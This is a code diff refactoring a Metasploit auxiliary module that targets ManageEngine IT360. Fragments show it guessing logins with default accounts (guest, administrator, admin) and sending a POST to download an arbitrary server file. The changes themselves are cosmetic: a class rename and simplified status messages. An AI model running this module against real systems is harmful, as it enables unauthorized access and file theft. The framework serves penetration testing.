@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
@@ -48,7 +45,7 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('USERNAME', [false, 'The username to login as (IT360 target only)']),
         OptString.new('PASSWORD', [false, 'Password for the specified username (IT360 target only)']),
         OptString.new('DOMAIN_NAME', [false, 'Name of the domain to logon to (IT360 target only)'])
-      ], self.class)
+      ])
   end
 
 
@@ -151,7 +148,7 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     if datastore['USERNAME'] && datastore['PASSWORD']
-      print_status("#{peer} - Trying to authenticate as #{datastore['USERNAME']}/#{datastore['PASSWORD']}...")
+      print_status("Trying to authenticate as #{datastore['USERNAME']}/#{datastore['PASSWORD']}...")
       cookie = authenticate_it360(uri[0], uri[1], datastore['USERNAME'], datastore['PASSWORD'])
       unless cookie.nil?
         return cookie
@@ -161,7 +158,7 @@ class Metasploit3 < Msf::Auxiliary
     default_users = ['guest', 'administrator', 'admin']
 
     default_users.each do |user|
-      print_status("#{peer} - Trying to authenticate as #{user}...")
+      print_status("Trying to authenticate as #{user}...")
       cookie = authenticate_it360(uri[0], uri[1], user, user)
       unless cookie.nil?
         return cookie
@@ -179,10 +176,10 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     if detect_it360
-      print_status("#{peer} - Detected IT360, attempting to login...")
+      print_status("Detected IT360, attempting to login...")
       cookie = login_it360
       if cookie.nil?
-        print_error("#{peer} - Failed to login to IT360!")
+        print_error("Failed to login to IT360!")
         return
       end
     else
@@ -201,7 +198,7 @@ class Metasploit3 < Msf::Auxiliary
 
     # Create request
     begin
-      print_status("#{peer} - Downloading file #{datastore['FILEPATH']}")
+      print_status("Downloading file #{datastore['FILEPATH']}")
       res = send_request_cgi({
         'method' => 'POST',
         'cookie' => cookie,
@@ -212,7 +209,7 @@ class Metasploit3 < Msf::Auxiliary
         }
       })
     rescue Rex::ConnectionRefused
-      print_error("#{peer} - Could not connect.")
+      print_error("Could not connect.")
       return
     end
 
@@ -220,7 +217,7 @@ class Metasploit3 < Msf::Auxiliary
     if res && res.code == 200
 
       if res.body.to_s.bytesize == 0
-        print_error("#{peer} - 0 bytes returned, file does not exist or is empty.")
+        print_error("0 bytes returned, file does not exist or is empty.")
         return
       end
 
@@ -236,7 +233,7 @@ class Metasploit3 < Msf::Auxiliary
       )
       print_good("File saved in: #{path}")
     else
-      print_error("#{peer} - Failed to download file.")
+      print_error("Failed to download file.")
     end
   end
 end
